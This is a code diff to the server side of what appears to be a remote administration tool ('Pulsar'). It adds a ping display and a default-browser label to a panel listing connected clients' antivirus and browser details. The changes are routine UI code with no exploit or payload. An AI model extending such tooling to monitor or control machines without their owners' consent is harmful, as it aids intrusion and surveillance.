@@ -32,6 +32,9 @@ namespace Pulsar.Server.Messages
         /// </summary>
         private readonly object _sizeLock = new object();
 
+        private int _lastPingMs = -1;
+        private GetPreviewResponse _lastPreviewResponse;
+
         public PreviewHandler(Client client, PictureBox box, ListView importantStatsView) : base(true)
         {
             _box = box;
@@ -123,6 +126,27 @@ namespace Pulsar.Server.Messages
                 {
                     UpdateStats(message);
                 }
+
+                if (Application.OpenForms["FrmMain"] is Pulsar.Server.Forms.FrmMain mainForm)
+                {
+                    mainForm.OnPreviewResponseReceived(message);
+                }
+            }
+        }
+
+        public void SetLastPing(int ms)
+        {
+            _lastPingMs = ms;
+            if (_verticleStatsTable != null && _verticleStatsTable.IsHandleCreated)
+            {
+                if (_verticleStatsTable.InvokeRequired)
+                {
+                    _verticleStatsTable.Invoke(new MethodInvoker(() => UpdateStats(_lastPreviewResponse)));
+                }
+                else
+                {
+                    UpdateStats(_lastPreviewResponse);
+                }
             }
         }
 
@@ -130,6 +154,8 @@ namespace Pulsar.Server.Messages
         {
             try
             {
+                _lastPreviewResponse = message;
+
                 // Check if the ListView has been initialized and has columns
                 if (_verticleStatsTable.Columns.Count < 2)
                 {
@@ -175,9 +201,13 @@ namespace Pulsar.Server.Messages
                 antivirusItem.SubItems.Add(message.AV);
                 _verticleStatsTable.Items.Add(antivirusItem);
 
-                var mainBrowserItem = new ListViewItem("Main Browser");
+                var mainBrowserItem = new ListViewItem("Default Browser");
                 mainBrowserItem.SubItems.Add(message.MainBrowser);
                 _verticleStatsTable.Items.Add(mainBrowserItem);
+
+                var pingItem = new ListViewItem("Ping");
+                pingItem.SubItems.Add(_lastPingMs >= 0 ? _lastPingMs + " ms" : "N/A");
+                _verticleStatsTable.Items.Add(pingItem);
             }
             catch (Exception ex)
             {
